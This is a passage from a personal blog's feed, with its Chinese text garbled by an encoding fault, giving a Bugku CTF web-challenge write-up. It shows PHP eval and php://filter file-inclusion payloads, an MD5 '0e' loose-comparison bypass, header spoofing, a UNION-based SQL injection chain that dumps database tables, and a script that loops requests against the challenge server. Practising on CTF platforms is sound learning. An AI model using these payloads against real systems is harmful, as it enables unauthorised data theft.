<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__destruct</span><br><span class="line">__get</span><br><span class="line">__call</span><br><span class="line">file_exists</span><br><span class="line">eval</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>
<h1>èµ›åå¤ç°</h1>
<p>é™¤äº†æŠŠç½‘ç«™çš„æºä»£ç æ‹–è¿›webç›®å½•ä¸‹, å¯¹äºæ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;ch4ser&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;some_pass&apos;;</span><br><span class="line">set password for &apos;ch4ser&apos;@&apos;localhost&apos;=password(&apos;toor&apos;);</span><br><span class="line">mysql -uch4ser -p -h localhost</span><br><span class="line">source xxxxx.sql</span><br><span class="line"></span><br><span class="line">å¦‚æœæœ‰æƒé™é—®é¢˜</span><br><span class="line">mysql -uroot -h localhost</span><br><span class="line">GRANT ALL PRIVILEGES ON xxxxxxx_db.* TO &apos;ch4ser&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
<h1>pyweb ç›¸å…³</h1>
<p>æ›´æ”¹ä»£ç åè¦é‡å¯, é™¤éapp.DEBUG = True, å¸¸è§äºconfig.php</p>
<p>ps -efæŸ¥çœ‹flaskæ€ä¹ˆå¯åŠ¨çš„å†é‡æ–°å¯åŠ¨</p>
]]></content>
  </entry>
  <entry>
    <title>bugku writeup</title>
    <url>/2019/04/22/bugku-writeup/</url>
    <content><![CDATA[<h1>bugku writeup</h1>
<h2 id="web3">web3</h2>
<p>ç½‘ç«™é‡Œé¢å¾ªç¯å¼¹å‡ºæç¤ºæ¡†ï¼Œç”¨chromeçš„å¼€å‘è€…å·¥å…·æ‰“å¼€ä¸€ç‰‡ç©ºç™½ï¼Œ<br>
ç”¨ctrl+uæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;</span><br><span class="line">&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;</span><br><span class="line">&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯unicodeï¼Œè½¬ç å³å¯</p>
<h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥ï¼">ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥ï¼</h2>
<p>æŸ¥çœ‹æºä»£ç ç«Ÿç„¶ç›´æ¥æœ‰flagäº†ï¼Œç½‘ä¸Šçš„è§£æ³•æ˜¯æŠ“åŒ…</p>
<h2 id="æœ¬åœ°åŒ…å«">æœ¬åœ°åŒ…å«</h2>
<p><img src="assets/markdown-img-paste-20181124142129765.png" alt><br>
è§£æ³•:åˆ©ç”¨hellowæ„é€ payload<br>
$_REQUESTï¼šé»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† $_GETï¼Œ$_POST å’Œ $_COOKIE çš„æ•°ç»„ã€‚<br>
var_dump():æ­¤å‡½æ•°æ˜¾ç¤ºæœ‰å…³åŒ…å«å…¶ç±»å‹å’Œå€¼çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„åŒ–ä¿¡æ¯ã€‚<br>
é€’å½’åœ°æ¢ç´¢æ•°ç»„å’Œå¯¹è±¡ï¼Œå…¶ä¸­å€¼ç¼©è¿›ä»¥æ˜¾ç¤ºç»“æ„ã€‚åœ¨è¿™é¢˜é‡Œé¢åªæ˜¯æ˜¾ç¤ºå˜é‡çš„ç±»å‹ï¼Œå¯¹<br>
evalå¹¶æ— å½±å“ï¼Œå¯¹äºevalæ¥è¯´ï¼Œå’Œevalï¼ˆ$aï¼‰æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>payloadï¼š/index.php?hello = show_source(â€˜flag.phpâ€™)<br>
ç½‘ä¸Šçš„payloadï¼š/index.php?hello=1);show_source(â€˜flag.phpâ€™);var_dump(</p>
<h2 id="åŸŸåè§£æ">åŸŸåè§£æ</h2>
<p>ç¼–è¾‘etc/hostsæ·»åŠ ä¸€æ¡123.206.87.240	 <a href="http://flag.bugku.com" target="_blank" rel="noopener">flag.bugku.com</a>ï¼Œ<br>
åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€flag.bugku.comå³å¯å¾—åˆ°flagã€‚</p>
<p>åæ€ï¼šhostè¯·æ±‚å¤´æ˜¯http1.1æ·»åŠ çš„ä¸œè¥¿ï¼Œ<br>
æ·»åŠ åŸŸåè§£æä¹‹åç›´æ¥è®¿é—®123.206.87.240å´æ˜¾ç¤º403ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨httpsä¸‹ä¸»æœºåå¿…ä¸å¯å°‘ã€‚</p>
<p>æ·»åŠ hostä¹‹å‰è®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯400ï¼ˆç¼ºå°‘hostï¼‰<br>
æ·»åŠ hostä¹‹åè®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯403ï¼ˆè¯»å–è®¿é—®è¢«ç¦ï¼‰</p>
<h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹">ä½ å¿…é¡»è®©ä»–åœä¸‹</h2>
<p>ä½¿ç”¨burpsuiteçš„repeateråŠŸèƒ½è¿›è¡ŒæŠ“åŒ…æ“ä½œï¼Œ<br>
é€šè¿‡å¤šæ¬¡ç‚¹å‡»goï¼Œæœ€ç»ˆå‘ç°åœ¨åŸå…ˆæ˜¯â€œflag is hereâ€çš„ä½ç½®å‡ºç°äº†flag</p>
<h2 id="å˜é‡1">å˜é‡1</h2>
<p>å‡½æ•°çŸ¥è¯†ï¼š<br>
issetï¼ˆï¼‰åˆ¤æ–­æ˜¯å¦æœ‰è¾“å…¥<br>
pre_matchæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¼•å·ä¸­çš„å†…å®¹éƒ½ä»¥/^å¼€å¤´ï¼Œä»¥$/ç»“å°¾ï¼Œ\w+çš„æ„æ€æ˜¯0~9 a~z A~Zï¼Œ<br>
è¾“å…¥çš„å†…å®¹è¢«é™å®šäº†ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å…¥ä»£ç </p>
<p><img src="assets/markdown-img-paste-20181124143335113.png" alt></p>
<p>è¾“å…¥arg=GLOBALSï¼Œä»ä»£ç ä¸­å¯çŸ¥ä¼šç»™GLOBALSå†å¥—ä¸Šä¸€ä¸ª$ï¼Œå°±è¾“å‡ºäº†flag</p>
<h2 id="Web5">Web5</h2>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jotherç¼–ç ï¼Œæ‰“å¼€æ§åˆ¶å°è¾“å…¥å°±è¡Œäº†</p>
<h2 id="å¤´ç­‰èˆ±">å¤´ç­‰èˆ±</h2>
<p>æ‰“å¼€ç½‘é¡µæ˜¾ç¤ºä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰“å¼€æ§åˆ¶å°é‡æ–°åŠ è½½çœ‹å¤´æ–‡ä»¶ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œ<br>
ç‚¹å‡»æ˜¾ç¤ºå¤´æ–‡ä»¶æºä»£ç ï¼Œæ˜¾ç¤ºflagï¼ˆæ³¨é‡Šå½¢å¼ï¼‰</p>
<p>ä¹Ÿå¯ä»¥ï¼š<br>
<img src="assets/markdown-img-paste-20181124145558281.png" alt></p>
<h2 id="ç½‘ç«™è¢«é»‘">ç½‘ç«™è¢«é»‘</h2>
<p>æ‰«æç«¯å£<br>
<img src="assets/markdown-img-paste-20181124145054565.png" alt><br>
å‘ç°ç™»é™†ç•Œé¢</p>
<p>ç„¶åç”¨burpsuiteçš„intruderåŠŸèƒ½ç ´è§£</p>
<h2 id="ç®¡ç†å‘˜ç³»ç»Ÿ">ç®¡ç†å‘˜ç³»ç»Ÿ</h2>
<p>æ‰“å¼€ç•Œé¢åæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œè¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œç‚¹å‡»æ˜¾ç¤ºï¼š<br>
<img src="assets/markdown-img-paste-20181124145951495.png" alt></p>
<p>å®åœ¨æ²¡æœ‰å¤´ç»ªï¼Œä¸Šç½‘æŸ¥è¯´è¿™æ˜¯X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œ<br>
ä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚<br>
ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡å‘é€çš„æ—¶å€™ä¼šè®°å½•æœ¬ä¸»æœºçš„ipï¼Œä¹‹åæ¯æ¬¡ç»è¿‡ä¸€ä¸ªä»£ç†ï¼Œ<br>
éƒ½ä¼šåœ¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ªä»£ç†çš„ipï¼Œ<br>
X-Forwarded-Forå¯ä»¥æ˜¾ç¤ºå®Œæ•´çš„ä¼ è¾“è·¯å¾„å’Œæ¶æ„æ”»å‡»æ¥æºä½†æ˜¯X-Forward-Forå¯ä»¥è¢«ä¼ªé€ ã€‚é¢˜ç›®ä¸­è¯´è”ç³»æœ¬åœ°ç®¡ç†å‘˜ï¼Œé‚£å°±è®¾ç½®X-Forwarded-Forä¸ºä»£è¡¨æœ¬åœ°è®¿é—®çš„127.0.0.1ã€‚<br>
åŒæ—¶æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°ï¼Œæœ‰ä¸€ä¸²æ³¨é‡Šï¼ŒæŸ¥åˆ°è¯´æ˜¯base64ç¼–ç ï¼Œ<br>
ç‰¹å¾æ˜¯ç»“å°¾ä»¥ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ª=ç»“æŸï¼Œè§£ç åå¾—åˆ°å¯†ç ï¼Œè¾“å…¥åä½¿ç”¨burpsuiteè¿›è¡Œæ‹¦æˆªï¼Œ<br>
æ·»åŠ X-Forwarded-Forï¼š127ã€‚0.0.1åå‘é€ï¼Œå¾—åˆ°äº†flag</p>
<p>å‚è€ƒèµ„æ–™ï¼šctfä¸­å¸¸è§çš„ç¼–ç æ ¼å¼ï¼š <a href="https://www.cnblogs.com/gwind/p/7997922.html" target="_blank" rel="noopener">https://www.cnblogs.com/gwind/p/7997922.html</a></p>
<h2 id="web4">web4</h2>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²urlç¼–ç çš„ä¸œè¥¿ï¼Œ<br>
Evalå‡½æ•°ä¼šå°†é‡Œé¢çš„å†…å®¹ä½œä¸ºä»£ç æ‰§è¡Œï¼Œunescapeå°†å…¶è§£ç ã€‚è¦è§£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74</span></span><br><span class="line"><span class="string">%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c</span></span><br><span class="line"><span class="string">%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%</span></span><br><span class="line"><span class="string">3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70</span></span><br><span class="line"><span class="string">%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d</span></span><br><span class="line"><span class="string">%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72</span></span><br><span class="line"><span class="string">%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72</span></span><br><span class="line"><span class="string">%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45</span></span><br><span class="line"><span class="string">%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75</span></span><br><span class="line"><span class="string">%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a+b)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">  alert(<span class="string">"Error"</span>);</span><br><span class="line">  a.focus();</span><br><span class="line">  <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºè¿™é‡Œå·²ç»æš´éœ²äº†passwordï¼Œè¿”å›è¾“å…¥å³å¯ã€‚</p>
<h2 id="flagåœ¨indexé‡Œé¢">flagåœ¨indexé‡Œé¢</h2>
<p>ç‚¹å‡»é“¾æ¥ï¼Œçœ‹urlï¼šfile=show.Phpï¼Œå‚æ•°fileæ˜¯å…³é”®ï¼Œ<br>
æœ¬åœ°åŒ…å«(include)ï¼šfile=phpï¼š//filter/read=convert.base64-encode/resource=index.php,</p>
<p>æœ‰å…³äºè¿™äº›åè®®çš„å†…å®¹è¦å¥½å¥½çœ‹çœ‹</p>
<h2 id="è¾“å…¥å¯†ç å¾—åˆ°flag">è¾“å…¥å¯†ç å¾—åˆ°flag</h2>
<p>ç”¨burpsuiteç›´æ¥æ‰“</p>
<h2 id="ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡">ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡</h2>
<p>ä½¿ç”¨hackbarä½¿ç”¨poståŠ¨ä½œï¼šclick = 1000001å°±å¾—åˆ°äº†flag</p>
<h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯">å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……">çŸ¥è¯†ç‚¹è¡¥å……</h3>
<p>$_SEVRERå‡½æ•°</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$SERVER[<span class="string">"$QUERY_STRING"</span>]</span><br><span class="line"><span class="comment">//è·å–æŸ¥è¯¢è¯­å¥ä¹Ÿå°±æ˜¯ï¼Ÿä¹‹åçš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">$SERBER[<span class="string">"REQUEST_URI"</span>]</span><br><span class="line"><span class="comment">//ç”¨æ¥è·å–URLä¸­çš„è·¯å¾„åœ°å€éƒ¨åˆ†ï¼ˆä¸æ˜¯urlï¼ï¼‰ä¾‹å¦‚ï¼šhttp://www.hujuntao.com/index.php?p=3</span></span><br><span class="line"><span class="comment">//$_SERVER['REQUEST_URI']è·å¾—çš„å°±æ˜¯/index.php?p=3è¿™éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_REWRITE_URL"</span>]</span><br><span class="line"><span class="comment">//åœ¨IISä¸‹åŠŸèƒ½åŒä¸Šï¼Œåœ¨apacheç¯å¢ƒä¸‹æ˜¾ç¤ºä¸ºç©º</span></span><br><span class="line"></span><br><span class="line">$SERVER[<span class="string">"SCRIPT_NAME"</span>]</span><br><span class="line"><span class="comment">//è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œæ¯”å¦‚â€œ/aaa/index.phpâ€</span></span><br><span class="line"></span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]</span><br><span class="line"><span class="comment">//æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬åï¼Œæ¯”å¦‚â€œ/aaa/index.phpâ€</span></span><br></pre></td></tr></table></figure>
<p>str function</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>)</span><br><span class="line"><span class="comment">//return the string after '?' (include '?')</span></span><br><span class="line"></span><br><span class="line">substr($str,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//return the string after the first symbol</span></span><br><span class="line"></span><br><span class="line">str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str)</span><br><span class="line"><span class="comment">//replace the 'key' in str to ''</span></span><br><span class="line"></span><br><span class="line">parse_str($str)</span><br><span class="line"><span class="comment">//parse the str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> example:</span><br><span class="line"></span><br><span class="line">    $str = <span class="string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨èç”¨æ³•</span></span><br><span class="line">    parse_str($str, $output);</span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'first'</span>];  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸å»ºè®®è¿™ä¹ˆç”¨</span></span><br><span class="line">    parse_str($str);</span><br><span class="line">    <span class="keyword">echo</span> $first;  <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">    <span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure>
<p>å›åˆ°bugkué¢˜ç›®ï¼šå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</p>
<p>æ‰“å¼€ç•Œé¢å‘ç°åªæœ‰ä¸€ä¸²å­—ç¬¦ä¸²<br>
<img src="assets/markdown-img-paste-20181124212115114.png" alt></p>
<p>æœç´¢index.php.bakå¯ä»¥çœ‹åˆ°æºç ï¼š</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);<span class="comment">//get string before "?"</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);                      <span class="comment">//get string after the second symbol</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);          <span class="comment">//replace 'key' to '' in str</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"å–å¾—flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶ååˆ†ææ„é€ payloadï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œç”¨MD5åŠ å¯†çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p>
<p>ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„æ•°å­—ï¼š</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>æ¯”è¾ƒmd5(username),md5(password),md5(code)ç±»å‹å’Œå€¼ï¼ŒåŒç­‰äºå­˜åœ¨æ¼æ´çš„åŸå› å…¶å®æ˜¯ï¼Œ0Eå¼€å¤´çš„MD5å€¼phpè§£æå™¨ä¼šè§£æä¸ºnumerical stringsï¼Œåœ¨åŒç­‰äºï¼ˆ==ï¼‰æƒ…å†µä¸‹ï¼Œä¼šå…ˆåˆ¤æ–­ç±»å‹ï¼Œè¯†åˆ«ä¸ºnumerical stringsï¼Œä¼šå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼Œæ‰€ä»¥0eå¼€å¤´çš„MD5å€¼éƒ½ä¸º0ï¼Œæ‰€ä»¥æ‰èƒ½ç»•è¿‡ï¼Œç„¶è€Œä¸‰ç­‰äºå°±æ¯”è¾ƒæœ‰è„¾æ°”äº†ï¼Œå¿…é¡»ä¸€å¯¹ä¸€çš„æ ¸å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¸å­˜åœ¨ä»€ä¹ˆç±»å‹è½¬æ¢é—®é¢˜ï¼Œæ‰€ä»¥å¼€å¤´0eç›¸åŒï¼Œåé¢ä¸åŒï¼Œä¹Ÿå°±ä¸æ»¡è¶³äº†</p>
<p>æ‰€ä»¥æ„é€ payloadï¼š</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php?kkey1=QNKCDZO&amp;kkey2=240610708</span><br></pre></td></tr></table></figure>
<p>æŒ‰ä¸‹å›è½¦å°±å¾—åˆ°äº†flag</p>
<p>å¦ï¼šæœ‰ä¸€ä¸ªæ‰«ææŸ¥çœ‹æºç æ³„éœ²çš„è„šæœ¬ï¼Œä½¿ç”¨æŒ‡å—å’Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š<br>
<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a></p>
<h2 id="æˆç»©å•">æˆç»©å•</h2>
<p><img src="assets/markdown-img-paste-20181124221811221.png" alt></p>
<p>åˆ¤æ–­æ˜¯æ•°æ®åº“çš„é—®é¢˜ï¼Œä¸€å¼€å§‹çŠ¯è ¢åœ¨urlæ¡†é‡Œé¢å†™payloadã€‚ã€‚ã€‚ã€‚<br>
æ ¹æ®æ˜¨å¤©æ‰€å­¦çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥1ï¼Œå¯ä»¥è¾“å‡ºæˆç»©å•ã€‚ç„¶åè¾“å…¥1â€™å‘ç°å¤±è´¥ï¼Œ<br>
åœ¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ª#åˆå¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ã€‚Emmmmã€‚ã€‚ã€‚ç„¶åç”±äºæˆç»©å•é‡Œé¢æœ‰ä¸‰ä¸ªåˆ—ï¼Œ<br>
æ‰€ä»¥ä»3å¼€å§‹è¯•è¯•çœ‹çœ‹åˆ°åº•æœ‰å‡ ä¸ªåˆ—ã€‚ã€‚ã€‚ã€‚<br>
æœ€ç»ˆåœ¨è¾“å…¥-1â€™ union select 1,2,3,4#çš„æ—¶å€™èƒ½å¤Ÿæ˜¾ç¤ºå‡ºå†…å®¹ï¼Œç”±æ­¤ç¡®å®šäº†æœ‰å››åˆ—ã€‚</p>
<p>è¿™ä¸ªåœ°æ–¹æœ‰ç‚¹è¿·ï¼šåŒæ ·æ˜¯postå½¢å¼ï¼Œ<br>
åœ¨æŸ¥è¯¢æ¡†é‡Œé¢è¾“å…¥1â€™#å°±å¯ä»¥ä½†æ˜¯åœ¨hackbaré‡Œé¢å†™id=1â€˜#å°±ä¸è¡Œï¼Œ<br>
ç„¶è€Œç”¨id=1ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºçš„ã€‚ã€‚ã€‚è¿™ä¸ªåœ°æ–¹å¾ˆæ˜¯è®©æˆ‘å›°æƒ‘ï¼Œ<br>
åæ¥çš„payloadä¹Ÿæ˜¯åœ¨æŸ¥è¯¢æ¡†é‡Œé¢å†™çš„ã€‚<br>
ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼ŒåŒæ ·æ˜¯æ³¨é‡Šï¼Œä¸ºå•¥#å°±å¯ä»¥èµ·ä½œç”¨ä½†æ˜¯â€“+å°±ä¸è¡Œï¼Œ<br>
è€ƒè™‘åˆ°é¢˜ç›®çš„ç±»å‹ï¼ˆæ°´é¢˜ï¼‰ï¼Œæ„Ÿè§‰ä¸å¤ªå¯èƒ½æ˜¯è¿‡æ»¤æ‰äº†ã€‚ã€‚ã€‚å¾ˆè¿·ã€‚ã€‚ã€‚ã€‚</p>
<p>å·²è§£å†³ï¼šâ€“+çš„â€˜+â€™çš„æ„æ€æ˜¯urlä¸­çš„ç©ºæ ¼ï¼ŒçœŸå®çš„æ³¨é‡Šä»…ä»…æ˜¯â€“</p>
<p><img src="assets/markdown-img-paste-20181124222217760.png" alt></p>
<p>åšå®Œè¿™ä¸€åˆ‡åå°±å¯ä»¥å¼€å§‹äº†ï¼š<br>
é¦–å…ˆæ˜¯æŸ¥åˆ°æ‰€æœ‰æ•°æ®åº“çš„åå­—<br>
-1â€™ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#  å¾—åˆ°äº†æ•°æ®åº“åå­—æœ‰ä¸€ä¸ªå«åšskctf_flagçš„<br>
æ¥ä¸‹æ¥ï¼Œé€šè¿‡æ•°æ®åº“åå­—æŸ¥æ‰¾è¡¨å<br>
-1â€™ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=â€™skctf_flagâ€™#		å¾—åˆ°äº†ä¸€ä¸ªå«åšfl4gçš„ä¸€ä¸ªè¡¨<br>
æ¥ä¸‹æ¥é€šè¿‡è¡¨æ˜æ‰¾åˆ—å<br>
-1â€™ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=â€™fl4gâ€™# å¾—åˆ°äº†ä¸€ä¸ªåˆ—åå­—å«åšskctf_flag<br>
æœ€åé€šè¿‡åˆ—åæ‰¾åˆ°å†…å®¹<br>
-1â€™union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g#<br>
å¾—åˆ°flag</p>
<p><img src="assets/markdown-img-paste-20181124222231565.png" alt></p>
<h2 id="cookieæ¬ºéª—">cookieæ¬ºéª—</h2>
<p>çœ‹åˆ°ç½‘å€é‡Œé¢filenameåé¢æ˜¯base64ç¼–ç çš„ä¸œè¥¿ï¼Œå°è¯•è§£ç çœ‹åˆ°æ˜¯keys.txt<br>
æ”¹æˆindex.phpè¯•ä¸€è¯•ï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªlineå‚æ•°ï¼Œéšä¾¿è¾“ä¸ª1ä»€ä¹ˆçš„ï¼Œå¯ä»¥çœ‹åˆ°æœ‰phpä»£ç è¿”å›<br>
ï¼ˆæœ‰ä¸€ä¸ªå›°æƒ‘å°±æ˜¯è¾“å…¥0ä¸è¿”å›æœ€å¼€å§‹çš„&lt;?phpï¼‰ç„¶åæ„é€ ä½ç«¯è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://123.206.87.240:8002/web11/index.php?line='</span></span><br><span class="line">url2 = <span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> para <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = url1 + repr(para) + url2</span><br><span class="line">    print(requests.get(url).content)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†ä»¥ä¸‹ä»£ç </p>
